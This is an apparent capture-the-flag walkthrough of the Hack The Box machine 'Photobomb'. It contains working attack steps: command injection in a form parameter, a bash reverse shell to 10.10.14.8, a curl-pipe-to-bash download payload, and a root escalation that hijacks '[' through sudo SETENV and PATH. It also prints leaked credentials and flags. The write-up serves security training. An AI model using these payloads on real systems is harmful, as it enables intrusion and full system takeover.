# Photobomb

## System

IP Address: `10.10.11.182`

Hostname: `photobomb.htb`

## Discovery

After a simple scan, only two ports: ssh and http

```bash
$ sudo nmap -sV photobomb.htb 
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

## HTTP

Let’s curl the HTTP port and see what we get:

```bash
$ curl -vv http://photobomb.htb
> GET / HTTP/1.1
< HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)
...
  <script src="photobomb.js"></script>
...
    <article>
      <h2>Welcome to your new Photobomb franchise!</h2>
      <p>You will soon be making an amazing income selling premium photographic gifts.</p>
      <p>This state of-the-art web application is your gateway to this fantastic new life. Your wish is its command.</p>
      <p>To get started, please <a href="/printer" class="creds">click here!</a> (the credentials are in your welcome pack).</p>
      <p>If you have any problems with your printer, please call our Technical Support team on 4 4283 77468377.</p>
    </article>
...
```

So we see a link to another page, `/printer`. There’s also a `photobomb.js`file that looks a little out of place. Let’s curl that and see what comes up:

```jsx
// $ curl -vv http://photobomb.htb/photobomb.js
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```

Wow! We lucked out. That’s a pretty gnarly find. It sounds like we can set a cookie, which might also be used elsewhere in the HTTP request flow. The main thing, though, is we have a set of credentials to use.

**Credentials Found: `pH0t0` / `b0Mb!`**

For good measure, let’s set a cookie as well for future requests (and also proxy to burpsuite):

```jsx
$ alias curlpbts="curl -b 'isPhotoBombTechSupport=true' --proxy http://127.0.0.1:8080"
```

### Printer

With that, let’s check out the `/printer` page:

```jsx
$ curlpbts -u 'pH0t0:b0Mb!' http://photobomb.htb/printer
<!DOCTYPE html>
<html>
<head>
  <title>Photobomb</title>
  <link type="text/css" rel="stylesheet" href="styles.css" media="all" />
</head>
<body>
  <div id="container">
    <header>
      <h1><a href="/">Photobomb</a></h1>
    </header>
    <form id="photo-form" action="/printer" method="post">
      <h3>Select an image</h3>
      <fieldset id="image-wrapper">
	      <input type="radio" name="photo" value="voicu-apostol-MWER49YaD-M-unsplash.jpg" id="voicu-apostol-MWER49YaD-M-unsplash.jpg" checked="checked" />
					<label for="voicu-apostol-MWER49YaD-M-unsplash.jpg" style="background-image: url(ui_images/voicu-apostol-MWER49YaD-M-unsplash.jpg)"></label>
					...
      </fieldset>
      <fieldset id="image-settings">
      <label for="filetype">File type</label>
      <select name="filetype" title="JPGs work on most printers, but some people think PNGs give better quality">
        <option value="jpg">JPG</option>
        <option value="png">PNG</option>
        </select>
      <div class="product-list">
        <input type="radio" name="dimensions" value="3000x2000" id="3000x2000" checked="checked"/><label for="3000x2000">3000x2000 - mousemat</label>
        <input type="radio" name="dimensions" value="1000x1500" id="1000x1500"/><label for="1000x1500">1000x1500 - mug</label>
        <input type="radio" name="dimensions" value="600x400" id="600x400"/><label for="600x400">600x400 - phone cover</label>
        <input type="radio" name="dimensions" value="300x200" id="300x200"/><label for="300x200">300x200 - keyring</label>
        <input type="radio" name="dimensions" value="150x100" id="150x100"/><label for="150x100">150x100 - usb stick</label>
        <input type="radio" name="dimensions" value="30x20" id="30x20"/><label for="30x20">30x20 - micro SD card</label>
      </div>
      </fieldset>
      <div class="controls">
        <button type="submit">download photo to print</button>
      </div>
    </form>
  </div>
</body>
</html>
```

So it looks like we have a `POST /printer` action that happens as a result. Let’s inspect a single request and see what the result is.

```jsx
POST /printer HTTP/1.1
Host: photobomb.htb
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
Origin: http://photobomb.htb
Authorization: Basic cEgwdDA6YjBNYiE=
Referer: http://photobomb.htb/printer

photo=mark-mc-neill-4xWHIpY2QcY-unsplash.jpg&filetype=jpg&dimensions=3000x2000
```

The result of that request is an image that is then downloaded at the dimensions we request. The first thing we can try is modifying the `photo` parameter and seeing if that changes the response:

```jsx
POST /printer HTTP/1.1
Host: photobomb.htb

photo=index.html&filetype=jpg&dimensions=3000x2000

Response:
Source photo does not exist.
```

It would be helpful to know which platform is running the web service. We know nginx is involved, but is there a specific framework serving content? Forcing a 404 gives a pretty good hint:

```jsx
$ curlpbts -u 'pH0t0:b0Mb!' -vv http://photobomb.htb/printer/nothere 
> GET http://photobomb.htb/printer/nothere HTTP/1.1
> Host: photobomb.htb
> Authorization: Basic cEgwdDA6YjBNYiE=
> Cookie: isPhotoBombTechSupport=true

< HTTP/1.1 404 Not Found
< Server: nginx/1.18.0 (Ubuntu)
< X-Cascade: pass
< X-Xss-Protection: 1; mode=block

...
  <h2>Sinatra doesn’t know this ditty.</h2>
  <img src='http://127.0.0.1:4567/__sinatra__/404.png'>
...
```

Perfect! Sinatra is a ruby framework, so we now at least know the language and framework working behind the scenes (as well as the port). After some trial and error, the important thing to know is that Ruby is the language powering the backend request. We can leverage this to inject commands into the parameters. For example, I used a simple POSIX sleep command to test if I could control the response time:

```jsx
POST /printer HTTP/1.1
Host: photobomb.htb
Content-Type: application/x-www-form-urlencoded
Authorization: Basic cEgwdDA6YjBNYiE=

photo=mark-mc-neill-4xWHIpY2QcY-unsplash.jpg&filetype=png;sleep 100&dimensions=3000x2000
```

Sure enough, the request timed out. Using this command injection, we can setup a listener, serving a reverse shell and get a connection back:

```bash
$ cat shell.sh
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.8/1337 0>&1
$ python -m http.server 8000 &
$ nc -lvnp 1337 &
```

Then we can execute our command and wait for our reverse shell:

```jsx
POST /printer HTTP/1.1
Host: photobomb.htb
Content-Type: application/x-www-form-urlencoded
Origin: http://photobomb.htb
Authorization: Basic cEgwdDA6YjBNYiE=

photo=mark-mc-neill-4xWHIpY2QcY-unsplash.jpg&filetype=png;curl%20http%3A%2F%2F10.10.14.8%3A8000%2Fshell.sh%7Cbash&dimensions=3000x2000
```

You’re a wizard, Harry!

```bash
$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.11.182] 56376
bash: cannot set terminal process group (702): Inappropriate ioctl for device
bash: no job control in this shell
wizard@photobomb:~/photobomb$
```

We can upgrade our shell (or make it a little more resilient) with a nifty trick explained [here](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```bash
wizard@photobomb:~/photobomb$ script /dev/null -c bash
Script started, file is /dev/null
wizard@photobomb:~/photobomb$ ^Z
[1]+  Stopped                 nc -lnvp 443
$ stty raw -echo ; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
wizard@photobomb:~/photobomb$
```

With that, we have the first flag:

```bash
wizard@photobomb:~/photobomb$ cd         
wizard@photobomb:~$ ls
photobomb  user.txt
wizard@photobomb:~$ cat user.txt 
245362eb4c9897a1a6008275ec4cc8ad
```

## User Escalation

Let’s see what this user can do:

```bash
wizard@photobomb:~$ sudo -l 
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

Looking into `/opt/cleanup.sh` we see

```bash
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

Nothing inherently interesting, but lets see what is being sourced in that `/opt/.bashrc` file:

```bash
# System-wide .bashrc file for interactive bash(1) shells.

# To enable the settings / commands in this file for login shells as well,
# this file has to be sourced in /etc/profile.

# Jameson: ensure that snaps don't interfere, 'cos they are dumb
PATH=${PATH/:\/snap\/bin/}

# Jameson: caused problems with testing whether to rotate the log file
enable -n [ # ]

# If not running interactively, don't do anything
[ -z "$PS1" ] && return

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi
```

The file continues, but there’s our admin `Jameson` up to something. Judging from his javascript workarounds before, this seems promising. There are two main things to note:

- PATH is being overwritten in the script to remove `/snap/bin`.
- `enable -n` instructs bash to not use builtin methods, preferring a PATH lookup for those commands instead.

The `# ]` is at first confusing until you see that it’s simply a bash comment. With `enable -n [` , effectively, we are instructing bash to lookup the “command” `[` in the PATH. From our `sudo -l` output earlier, we see that the user is given the `SETENV` command, which allows them to persist their environment. It’s becoming clear how we can exploit this:

- Overwrite the `[` command in the path to execute whatever we want.
- Overwrite the path to look first in the directory where our `[` script is located.

So we create `/tmp/bin` and create a file `[` in there with the contents:

```bash
#!/bin/bash
/bin/bash
```

We make it executable (`chmod +x /tmp/bin/[`) and try our command:

```bash
$ sudo PATH=/tmp/bin:$PATH /opt/cleanup.sh
root@photobomb:/home/wizard#
root@photobomb:/home/wizard# cd
root@photobomb:~# cat root.txt
612461521b36d4cd558a8735ec7d63a7
```

And with that, we’ve hacked the box. Had fun with this one!
